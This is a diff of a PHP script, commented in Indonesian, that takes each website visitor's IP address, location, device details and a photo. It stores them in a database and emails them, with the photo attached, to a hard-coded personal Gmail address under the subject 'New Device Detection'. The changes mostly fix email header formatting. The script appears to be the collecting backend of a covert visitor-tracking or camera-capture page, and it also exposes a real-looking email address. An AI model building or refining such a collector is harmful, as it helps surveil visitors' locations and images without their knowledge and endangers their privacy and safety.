@@ -10,56 +10,49 @@ if ($conn->connect_error) {
 }
 
 $data = json_decode(file_get_contents("php://input"), true);
-$ip = $data['ip'] ?? '';
+$ip     = $data['ip'] ?? '';
 $lokasi = $data['lokasi'] ?? '';
 $device = $data['device'] ?? '';
-$foto = $data['foto'] ?? '';
+$foto   = $data['foto'] ?? '';
 
+// Simpan ke database
 $stmt = $conn->prepare("INSERT INTO pengunjung (ip_address, lokasi, perangkat, foto) VALUES (?, ?, ?, ?)");
 $stmt->bind_param("ssss", $ip, $lokasi, $device, $foto);
 $stmt->execute();
 $stmt->close();
+$conn->close();
 
-// Kirim email dengan lampiran gambar
-$to = "agatanuraini48@gmail.com"; // GANTI EMAIL
-$subject = "Deteksi Perangkat Baru";
+// Kirim email
+$to       = "agatanuraini48@gmail.com"; // GANTI EMAIL TUJUAN
+$subject  = "Deteksi Perangkat Baru";
 $boundary = md5(uniqid());
+$filename = "foto_" . time() . ".png";
 
-$headers = "From: notifikasi@webmu.com
-";
-$headers .= "MIME-Version: 1.0
-";
-$headers .= "Content-Type: multipart/mixed; boundary="" . $boundary . ""
-";
+// Headers
+$headers  = "From: notifikasi@webmu.com\r\n";
+$headers .= "MIME-Version: 1.0\r\n";
+$headers .= "Content-Type: multipart/mixed; boundary=\"$boundary\"\r\n";
 
-$message = "--" . $boundary . "
-";
-$message .= "Content-Type: text/plain; charset=UTF-8
-";
-$message .= "Content-Transfer-Encoding: 7bit
+// Body Pesan
+$message  = "--$boundary\r\n";
+$message .= "Content-Type: text/plain; charset=UTF-8\r\n";
+$message .= "Content-Transfer-Encoding: 7bit\r\n\r\n";
+$message .= "IP Address : $ip\r\n";
+$message .= "Lokasi     : $lokasi\r\n";
+$message .= "Device     : $device\r\n\r\n";
 
-";
-$message .= "IP: $ip
-Lokasi: $lokasi
-Device: $device
+// Lampiran Gambar
+$fotoData = str_replace('data:image/png;base64,', '', $foto);
+$fotoData = base64_decode($fotoData);
+$encodedFoto = chunk_split(base64_encode($fotoData));
 
-";
+$message .= "--$boundary\r\n";
+$message .= "Content-Type: image/png; name=\"$filename\"\r\n";
+$message .= "Content-Transfer-Encoding: base64\r\n";
+$message .= "Content-Disposition: attachment; filename=\"$filename\"\r\n\r\n";
+$message .= $encodedFoto . "\r\n";
+$message .= "--$boundary--";
 
-$imgData = str_replace('data:image/png;base64,', '', $foto);
-$imgData = base64_decode($imgData);
-
-$message .= "--" . $boundary . "
-";
-$message .= "Content-Type: image/png; name="foto.png"
-";
-$message .= "Content-Disposition: attachment; filename="foto.png"
-";
-$message .= "Content-Transfer-Encoding: base64
-
-";
-$message .= chunk_split(base64_encode($imgData)) . "
-";
-$message .= "--" . $boundary . "--";
-
+// Kirim email
 mail($to, $subject, $message, $headers);
 ?>
